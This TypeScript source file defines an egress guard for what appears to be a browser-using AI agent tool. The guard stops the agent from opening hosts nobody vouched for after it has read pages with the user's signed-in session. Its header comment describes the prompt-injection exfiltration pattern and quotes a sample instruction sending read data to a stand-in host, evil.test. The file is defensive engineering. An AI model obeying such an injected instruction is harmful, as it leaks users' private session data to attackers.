import type { LocalMcpConfig } from '../config/schema.js';
import { hostMatches } from './policy.js';
import { isSignedInSite, type SiteEntry } from './sites.js';

/**
 * The exfiltration step of a prompt injection is a URL: "now open https://evil.test/?d=<what you
 * just read>". Once the agent has read a page with the user's session, this guard stops it from
 * opening a host nobody vouched for. Vouched-for hosts are: the signed-in sites themselves,
 * `policy.allow`, hosts read with the session (the sources), and hosts the user approved.
 *
 * Hosts visited *before* the signed-in read are deliberately not trusted: the injected page is
 * usually read first, and its own host is the most likely place for the data to go.
 */
export type EgressDecision =
  | { ok: true }
  | { ok: false; host: string; confirmable: boolean; reason: string };

export class EgressGuard {
  private source: string | null = null;
  private readonly approved = new Set<string>();

  constructor(
    private readonly policy: LocalMcpConfig['policy'],
    private readonly sites: readonly SiteEntry[]
  ) {}

  /** The first host read with the user's session in this run, if any. */
  get signedInSource(): string | null {
    return this.source;
  }

  noteRead(url: string, signedIn: boolean): void {
    if (!signedIn) return;
    const host = hostOf(url);
    if (!host) return;
    this.source ??= host;
    this.approved.add(host);
  }

  approve(host: string): void {
    this.approved.add(host);
  }

  check(raw: string): EgressDecision {
    if (this.policy.egress === 'open' || !this.source) return { ok: true };
    let url: URL;
    try {
      url = new URL(raw);
    } catch {
      return { ok: true }; // the URL policy check reports malformed URLs
    }
    if (this.approved.has(url.host)) return { ok: true };
    if (isSignedInSite(raw, this.sites)) return { ok: true };
    if (this.policy.allow.some((p) => hostMatches(p, url))) return { ok: true };

    const confirmable = this.policy.egress === 'confirm';
    return {
      ok: false,
      host: url.host,
      confirmable,
      reason:
        `${url.host} wasn't opened: this session already read ${this.source} with your signed-in browser, ` +
        `and ${url.host} isn't a signed-in site, in policy.allow, or approved. ` +
        (confirmable
          ? `This client can't ask you to approve it. Add "${url.hostname}" to policy.allow in .localmcp.json, or set policy.egress to "open".`
          : `policy.egress is "block". Add "${url.hostname}" to policy.allow to permit it.`),
    };
  }
}

function hostOf(raw: string): string | null {
  try {
    return new URL(raw).host || null;
  } catch {
    return null;
  }
}
